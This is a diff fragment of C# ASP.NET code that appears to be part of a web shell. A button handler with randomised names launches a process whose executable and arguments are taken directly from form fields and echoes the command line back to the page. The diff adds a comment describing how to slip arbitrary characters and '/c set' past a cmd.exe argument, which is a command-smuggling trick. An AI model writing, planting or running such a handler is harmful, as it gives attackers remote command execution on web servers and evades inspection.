@@ -7,6 +7,7 @@ protected void FbhN(object sender,EventArgs e)
     {
         Process ahAE=new Process();
         ahAE.StartInfo.FileName=kusi.Value;
+        //cmd.exe c:\xxx'\c set  cmd.exe  (任意字符) /c set
         ahAE.StartInfo.Arguments=@"'C:\Windows\Microsoft.NET\Framework\v4.0.30319\cbc.exe'" + bkcm.Value;
         Response.Write(ahAE.StartInfo.Arguments);
         ahAE.StartInfo.UseShellExecute=false;
